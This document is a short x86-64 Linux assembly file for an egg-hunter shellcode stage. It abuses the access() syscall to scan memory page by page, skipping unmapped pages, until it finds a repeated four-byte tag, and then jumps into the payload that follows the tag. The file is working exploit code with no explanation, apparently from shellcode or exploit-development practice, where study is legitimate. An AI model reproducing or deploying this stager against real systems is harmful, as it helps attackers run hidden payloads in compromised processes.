global _start
section .text
_start:

;STEP1
	;int access(const char *pathname, int mode);
	xor rsi, rsi
	push rsi
	pop rdi

;STEP2
go_to_next_page:
	or di, 0xfff
	inc rdi

;STEP3
forward_4_bytes:
	xor rax, rax
	mov al, 21
	syscall

;STEP4
efault_check:
	cmp al, 0xf2
	jz go_to_next_page
	mov eax, 0x9050904f
	inc al
	scasd
	jnz forward_4_bytes
	jmp rdi
